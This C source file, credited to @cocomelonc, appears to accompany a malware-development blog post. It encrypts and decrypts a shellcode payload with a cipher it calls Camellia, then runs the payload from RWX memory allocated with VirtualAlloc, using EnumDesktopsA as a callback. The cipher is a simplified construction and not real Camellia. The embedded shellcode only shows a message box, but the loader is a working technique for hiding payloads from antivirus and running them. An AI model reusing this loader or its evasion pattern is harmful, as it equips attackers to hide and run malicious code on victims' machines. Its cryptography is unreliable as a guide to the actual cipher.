/*
* hack.c
* encrypt/decrypt payload via
* Camellia cipher
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/12/29/malware-cryptography-38.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define BLOCK_SIZE 16 // Camellia operates on 128-bit blocks

// Camellia S-box and constants
static const struct {
  uint8_t sbox1[256];
} camellia = {
  .sbox1 = {
    112, 130,  44, 236, 179,  39, 192, 229, 228, 133,  87,  53, 234,  12, 174,  65,
    35, 239, 107, 147,  69,  25, 165,  33, 237,  14,  79,  78,  29, 101, 146, 189,
    134, 184, 175, 143, 124, 235,  31, 206,  62,  48, 220,  95,  94, 197,  11,  26,
    166, 225,  57, 202, 213,  71,  93,  61, 217,   1,  90, 214,  81,  86, 108,  77,
    139,  13, 154, 102, 251, 204, 176,  45, 116,  18,  43,  32, 240, 177, 132, 153,
    223,  76, 203, 194,  52, 126, 118,   5, 109, 183, 169,  49, 209,  23,   4, 215,
    20,  88,  58,  97, 222,  27,  17,  28,  50,  15, 156,  22,  83,  24, 242,  34,
    254,  68, 207, 178, 195, 181, 122, 145,  36,   8, 232, 168,  96, 252, 105,  80,
    170, 208, 160, 125, 161, 137,  98, 151,  84,  91,  30, 149, 224, 255, 100, 210,
    16, 196,   0,  72, 163, 247, 117, 219, 138,   3, 230, 218,   9,  63, 221, 148,
    135,  92, 131,   2, 205,  74, 144,  51, 115, 103, 246, 243, 157, 127, 191, 226,
    82, 155, 216,  38, 200,  55, 198,  59, 129, 150, 111,  75,  19, 190,  99,  46,
    233, 121, 167, 140, 159, 110, 188, 142,  41, 245, 249, 182,  47, 253, 180,  89,
    120, 152,   6, 106, 231,  70, 113, 186, 212,  37, 171,  66, 136, 162, 141, 250,
    114,   7, 185,  85, 248, 238, 172,  10,  54,  73,  42, 104,  60,  56, 241, 164,
    64,  40, 211, 123, 187, 201,  67, 193,  21, 227, 173, 244, 119, 199, 128, 158
  }
};

// rotate left
#define ROTL64(x, n) (((x) << (n)) | ((x) >> (64 - (n))))

// Camellia F function
static uint64_t camellia_f(uint64_t input, uint64_t key) {
  input ^= key;
  uint8_t y[8];
  y[0] = camellia.sbox1[(input >> 56) & 0xFF];
  y[1] = camellia.sbox1[(input >> 48) & 0xFF];
  y[2] = camellia.sbox1[(input >> 40) & 0xFF];
  y[3] = camellia.sbox1[(input >> 32) & 0xFF];
  y[4] = camellia.sbox1[(input >> 24) & 0xFF];
  y[5] = camellia.sbox1[(input >> 16) & 0xFF];
  y[6] = camellia.sbox1[(input >> 8) & 0xFF];
  y[7] = camellia.sbox1[input & 0xFF];
  return ((uint64_t)y[0] << 56) | ((uint64_t)y[1] << 48) |
         ((uint64_t)y[2] << 40) | ((uint64_t)y[3] << 32) |
         ((uint64_t)y[4] << 24) | ((uint64_t)y[5] << 16) |
         ((uint64_t)y[6] << 8) | y[7];
}

// encrypt a single block
void camellia_encrypt_block(uint8_t *block, uint64_t key1, uint64_t key2) {
  uint64_t left = ((uint64_t)block[0] << 56) | ((uint64_t)block[1] << 48) |
                ((uint64_t)block[2] << 40) | ((uint64_t)block[3] << 32) |
                ((uint64_t)block[4] << 24) | ((uint64_t)block[5] << 16) |
                ((uint64_t)block[6] << 8) | (uint64_t)block[7];
  uint64_t right = ((uint64_t)block[8] << 56) | ((uint64_t)block[9] << 48) |
                ((uint64_t)block[10] << 40) | ((uint64_t)block[11] << 32) |
                ((uint64_t)block[12] << 24) | ((uint64_t)block[13] << 16) |
                ((uint64_t)block[14] << 8) | (uint64_t)block[15];

  for (int i = 0; i < 8; i++) {
    right ^= camellia_f(left, key1);
    left ^= camellia_f(right, key2);
  }

  // swap left and right
  uint64_t temp = left;
  left = right;
  right = temp;

  // write back the encrypted block
  block[0] = (left >> 56) & 0xFF;
  block[1] = (left >> 48) & 0xFF;
  block[2] = (left >> 40) & 0xFF;
  block[3] = (left >> 32) & 0xFF;
  block[4] = (left >> 24) & 0xFF;
  block[5] = (left >> 16) & 0xFF;
  block[6] = (left >> 8) & 0xFF;
  block[7] = left & 0xFF;

  block[8] = (right >> 56) & 0xFF;
  block[9] = (right >> 48) & 0xFF;
  block[10] = (right >> 40) & 0xFF;
  block[11] = (right >> 32) & 0xFF;
  block[12] = (right >> 24) & 0xFF;
  block[13] = (right >> 16) & 0xFF;
  block[14] = (right >> 8) & 0xFF;
  block[15] = right & 0xFF;
}

// decrypt a single block
void camellia_decrypt_block(uint8_t *block, uint64_t key1, uint64_t key2) {
  uint64_t left = ((uint64_t)block[0] << 56) | ((uint64_t)block[1] << 48) |
            ((uint64_t)block[2] << 40) | ((uint64_t)block[3] << 32) |
            ((uint64_t)block[4] << 24) | ((uint64_t)block[5] << 16) |
            ((uint64_t)block[6] << 8) | (uint64_t)block[7];
  uint64_t right = ((uint64_t)block[8] << 56) | ((uint64_t)block[9] << 48) |
            ((uint64_t)block[10] << 40) | ((uint64_t)block[11] << 32) |
            ((uint64_t)block[12] << 24) | ((uint64_t)block[13] << 16) |
            ((uint64_t)block[14] << 8) | (uint64_t)block[15];

  // swap left and right
  uint64_t temp = left;
  left = right;
  right = temp;

  for (int i = 0; i < 8; i++) {
    left ^= camellia_f(right, key2);
    right ^= camellia_f(left, key1);
  }

  // Write back the decrypted block
  block[0] = (left >> 56) & 0xFF;
  block[1] = (left >> 48) & 0xFF;
  block[2] = (left >> 40) & 0xFF;
  block[3] = (left >> 32) & 0xFF;
  block[4] = (left >> 24) & 0xFF;
  block[5] = (left >> 16) & 0xFF;
  block[6] = (left >> 8) & 0xFF;
  block[7] = left & 0xFF;

  block[8] = (right >> 56) & 0xFF;
  block[9] = (right >> 48) & 0xFF;
  block[10] = (right >> 40) & 0xFF;
  block[11] = (right >> 32) & 0xFF;
  block[12] = (right >> 24) & 0xFF;
  block[13] = (right >> 16) & 0xFF;
  block[14] = (right >> 8) & 0xFF;
  block[15] = right & 0xFF;
}

// encrypt payload with padding
void camellia_encrypt_payload(unsigned char *payload, int payload_len, uint64_t key1, uint64_t key2) {
  int i;
  for (i = 0; i < payload_len / BLOCK_SIZE; i++) {
    camellia_encrypt_block(payload + i * BLOCK_SIZE, key1, key2);
  }
  // check if there are remaining bytes
  int remaining = payload_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, remaining);
    camellia_encrypt_block(pad, key1, key2);
    memcpy(payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, pad, remaining);
  }
}

// decrypt payload
void camellia_decrypt_payload(unsigned char *payload, int payload_len, uint64_t key1, uint64_t key2) {
  int i;
  for (i = 0; i < payload_len / BLOCK_SIZE; i++) {
    camellia_decrypt_block(payload + i * BLOCK_SIZE, key1, key2);
  }
  // check if there are remaining bytes
  int remaining = payload_len % BLOCK_SIZE;
  if (remaining != 0) {
    unsigned char pad[BLOCK_SIZE] = {0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
    memcpy(pad, payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, remaining);
    camellia_decrypt_block(pad, key1, key2);
    memcpy(payload + (payload_len / BLOCK_SIZE) * BLOCK_SIZE, pad, remaining);
  }
}

// main function
int main() {
  unsigned char my_payload[] = 
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  int my_payload_len = sizeof(my_payload);
  uint64_t key1 = 0x0123456789ABCDEF;
  uint64_t key2 = 0xFEDCBA9876543210;

  int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) % BLOCK_SIZE;
  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);
  memcpy(padded, my_payload, my_payload_len);

  printf("original payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  camellia_encrypt_payload(padded, pad_len, key1, key2);

  printf("encrypted payload: ");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  camellia_decrypt_payload(padded, pad_len, key1, key2);

  printf("decrypted payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");
  
  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);
  
  return 0;
}